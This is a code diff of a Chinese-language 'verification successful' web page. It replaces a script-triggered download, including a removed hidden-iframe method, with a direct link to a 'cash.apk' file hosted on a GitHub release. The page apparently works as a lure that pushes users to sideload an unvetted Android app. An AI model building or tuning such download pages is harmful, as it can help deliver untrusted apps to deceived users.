@@ -113,7 +113,7 @@
             <h1>验证成功</h1>
             <p class="subtitle">点击下方按钮下载cash APP</p>
             
-            <a href="#" class="download-btn" id="downloadBtn" onclick="downloadApk(); return false;">
+            <a href="https://github.com/asd886688/china-travel-verify/releases/download/v1.0.0/cash.apk" class="download-btn" download>
                 下载 cash APK
             </a>
             
@@ -166,16 +166,8 @@
         }
         
         function downloadApk() {
-            // 创建隐藏的iframe来触发下载
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = APK_URL;
-            document.body.appendChild(iframe);
-            
-            // 同时尝试使用window.location
-            setTimeout(function() {
-                window.location.href = APK_URL;
-            }, 100);
+            // 直接使用 window.location 下载
+            window.location.href = APK_URL;
         }
     </script>
 </body>
